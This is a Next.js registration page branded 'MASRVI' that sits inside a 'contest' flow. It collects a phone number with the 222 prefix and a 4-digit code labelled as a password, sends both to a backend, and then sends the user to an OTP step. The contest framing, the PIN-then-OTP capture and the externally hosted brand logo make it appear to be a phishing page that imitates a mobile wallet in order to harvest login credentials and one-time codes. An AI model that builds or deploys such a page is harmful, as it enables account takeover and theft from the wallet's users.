import { useState } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import { useContest } from '@/context/ContestContext';

export default function RegisterPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { updateRegistration } = useContest();
  const [phone, setPhone] = useState('');
  const [entryCode, setEntryCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setPhone(value);
  };

  const handleCodeChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setEntryCode(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data } = await axios.post('/api/register', { phone, entryCode });

      if (data.success) {
        updateRegistration(phone, entryCode);
        router.push('/otp');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Head>
        <title>MASRVI - {t('registration.submit')}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo */}
              <div className="text-center mb-6 md:mb-8">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/5810143423896424381_120-1uDefD1vhhxaUyEWoZbKOogvt8VlOX.jpg"
                  alt="Masrvi Logo"
                  width={150}
                  height={60}
                  className="h-14 md:h-16 w-auto mx-auto mb-4 object-contain mix-blend-multiply"
                />
                <h1 className="text-xl md:text-2xl font-bold text-gray-900">{t('registration.submit')}</h1>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5 md:space-y-6">
                <div>
                  <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                    {t('registration.phone_label')}
                  </label>
                  <div className="flex gap-2">
                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 font-bold text-base md:text-lg">
                      222
                    </div>
                    <input
                      id="phone"
                      type="tel"
                      inputMode="numeric"
                      maxLength={8}
                      value={phone}
                      onChange={handlePhoneChange}
                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label htmlFor="entryCode" className="block text-sm font-medium text-gray-700 mb-2">
                    {t('registration.password_label')}
                  </label>
                  <input
                    id="entryCode"
                    type="tel"
                    inputMode="numeric"
                    maxLength={4}
                    value={entryCode}
                    onChange={handleCodeChange}
                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium text-center tracking-widest"
                    required
                  />
                </div>

                <div className="pt-2 md:pt-4">
                  <button
                    type="submit"
                    disabled={loading || phone.length < 8 || entryCode.length < 4}
                    className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg"
                  >
                    {loading ? '...' : t('registration.submit')}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Green Bottom Section */}
        <div className="bg-primary-500 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
          <p className="text-white text-center text-base md:text-lg font-medium">
            Mon wallet 100% simple et securise
          </p>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_registration')}
        buttonText={t('errors.retry')}
        onClose={() => setShowError(false)}
      />
    </>
  );
}
